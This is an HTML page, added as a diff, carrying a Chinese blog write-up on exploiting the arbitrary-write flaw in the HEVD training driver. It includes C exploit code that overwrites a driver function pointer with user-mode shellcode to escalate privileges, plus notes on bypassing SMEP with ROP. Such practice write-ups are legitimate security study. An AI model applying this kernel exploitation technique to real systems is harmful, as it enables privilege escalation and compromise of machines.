@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<head>
+<meta charset="UTF-8" /><title>PureWeb Blog-【Win Pwn】HEVD-任意地址写</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css" /><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>  <script>    document.querySelectorAll('code').forEach((code) => {      if (!code.classList.length) {        code.classList.add('language-bash');      }    });  </script>	<script>		document.addEventListener('DOMContentLoaded', (event) => {			hljs.highlightAll();		});	</script><link rel="stylesheet" href="/TestRepogithub.css">
+<link rel="stylesheet" href="/TestRepospeciou.css"
+</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/TestRepo">Joe1sn's Cabin</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link active" href="/TestRepo" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/TestRepoarchives/"target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn"target="_blank">GITHUB</a></li></ul></nav></header></div><div id="write" class>
+<div id="write" class>
+<div class="typora-export os-windows"><div id="write" class>
+<p><strong>2024-02-23 23:35:34</strong></p>
+<p>非预期方法，暂时不会放出来</p>
+<!--more-->
+<h1>HEVD练习-任意地址写</h1>
+<h2>漏洞点</h2>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/ab81f0548c9c7beae376282f0a845c14.png" alt="image-20240216173136321" /></p>
+<h2>一点好玩的</h2>
+<p>传入一个结构体，得到结构体过后写入内容</p>
+<p>结构体</p>
+<pre><code class="language-c">	typedef struct _WRITE_WHAT_WHERE
+	{
+		unsigned int* What;
+		unsigned int* Where;
+	}arbitrary_write, *pArbitraryWrite;
+</code></pre>
+<p>这里我做一个比较有意思的事儿，比如修改某个变量的值</p>
+<pre><code class="language-c">	printf(&quot;[*] Start Exploit\n&quot;);
+	pArbitraryWrite payload = (pArbitraryWrite)malloc(sizeof(arbitrary_write));
+	if (payload == NULL) {
+		printf(&quot;[!] Malloc payload failed\n&quot;);
+		return;
+	}
+	int vuln = 0x10000;
+	int pay = 0xDEADBEEF;
+	printf(&quot;[-] the vuln value is 0x%x\n&quot;, vuln);
+	payload-&gt;What = (unsigned int *)&amp;pay;
+	payload-&gt;Where = (unsigned int *)&amp;vuln;
+	DWORD size = sizeof(payload);
+
+	DWORD info = 0;
+	system(&quot;pause&quot;);
+	DeviceIoControl(hDevice, ioctl,
+		payload, size,
+		NULL, 0,
+		&amp;info, NULL);
+	printf(&quot;[-] now vuln value is 0x%x&quot;, vuln);
+</code></pre>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/46a0ef83a8f20889bc2d73915c1ab5f1.png" alt="image-20240216174148214" /></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/2a02f670b395a1f09d2e95b1992ce847.png" alt="image-20240216174214564" /></p>
+<p>利用ioctl的机制也可以实现读取某个地址的值</p>
+<h2>预期打法</h2>
+<p>最开始栈溢出我们提权使用的是修改当前的Token的低位并修改Token的Present和Enable，如果这里我们知道地址的话就可以做一样的操作了</p>
+<p>但是在普通权限下不可能知道地址，那么我们是否能够覆盖HEVD驱动中的某些函数，使用类似inline hook的方式，将函数地址改为我们shellcode的地址，这样我们把问题变成了和内核栈溢出类似的情况了</p>
+<p>利用之前的<code>NtQueryInfomation</code>的<code>ulGetKernelBase</code>函数可以获得HEVD的基地址</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/9e0926c08abe24bc42efe409abb7e4a0.png" alt="image-20240216200738623" /></p>
+<p>这里我就尝试覆写DbgPrintEx函数为shellcode</p>
+<pre><code class="language-c">	printf(&quot;[*] Start Exploit\n&quot;);
+	pArbitraryWrite payload = (pArbitraryWrite)malloc(sizeof(arbitrary_write));
+	if (payload == NULL) {
+		printf(&quot;[!] Malloc payload failed\n&quot;);
+		return;
+	}
+	funcaddr hevd_base = ulGetKernelBase((PCHAR)&quot;HEVD&quot;);
+	funcaddr dbgprint_addr = hevd_base + 0x2008;
+	funcaddr nt_base = ulGetKernelBase((PCHAR)&quot;ntoskrnl.exe&quot;);
+	printf(&quot;[*] HEVD SYS kernel base %llx\n&quot;, hevd_base);
+	printf(&quot;[*] ntoskrnl kernel base %llx\n&quot;, nt_base);
+	printf(&quot;[*] HEVD DbgPrint Address %llx\n&quot;, dbgprint_addr);
+
+	printf(&quot;[*] Allocate Shellcode Space\n&quot;);
+	LPVOID shellcode_addr = VirtualAlloc(NULL,
+		sizeof(cmd),
+		MEM_COMMIT | MEM_RESERVE,
+		PAGE_EXECUTE_READWRITE);
+	if (shellcode_addr == NULL) {
+		printf(&quot;[!] shellcode addr failed\n&quot;);
+		return;
+	}
+	memcpy(shellcode_addr, cmd, sizeof(cmd));
+	printf(&quot;[*] Shellcode addr %llx\n&quot;, shellcode_addr);
+
+	payload-&gt;What = (unsigned int *)&amp;shellcode_addr;
+	payload-&gt;Where = (unsigned int *)dbgprint_addr;
+	DWORD size = sizeof(payload);
+
+	DWORD info = 0;
+	system(&quot;pause&quot;);
+	DeviceIoControl(hDevice, ioctl,
+		payload, size,
+		NULL, 0,
+		&amp;info, NULL);
+	system(&quot;cmd.exe&quot;);
+</code></pre>
+<p>注意，覆写的是<code>HEVD_BASE+0x2008</code>的值 所指向的值</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/575c9467678be806ed46eff70b42791e.png" alt="image-20240216210359750" /></p>
+<p>成功覆写</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/d176b13c88d12fff078f41084333a6ed.png" alt="image-20240216210450239" /></p>
+<p>现在比较麻烦的就是过SMEP保护。</p>
+<p>可以利用之前GS保护使用的内核栈泄露
+https://joe1sn.eu.org/2024/02/24/win-hevd-exp-stackoverflow-GS/</p>
+<p>直接在栈上布置参数和ROP链，要么取消SMEP，要么参考KVAS直接使用ROP链申请的堆中执行，后续操作就和栈溢出一致，只不过需要把某个函数该地址改为第一个ROP地址</p>
+<h2>非预期利用</h2>
+<p>写到这里在翻查别人wp的时候突然想到驱动是一直在后台运行的，我们可以多次触发该漏洞，然后我用了一种非常规的方法，eee，目前这种方法我还用在一些项目上，所以暂时不公开...SORRY</p>
+<p>方法可以参考：https://0dr3f.github.io/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/
+（虽然我的方法比他简单很多）</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/ffd66dc4226285ae67ff3ae69b05715a.png" alt="image-20240216232930887" /></p>
+<p>可以优雅退出不卡顿</p>
+<h1>引用</h1>
+<p>https://0dr3f.github.io/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/</p>
+
+</div>
+</div></body>
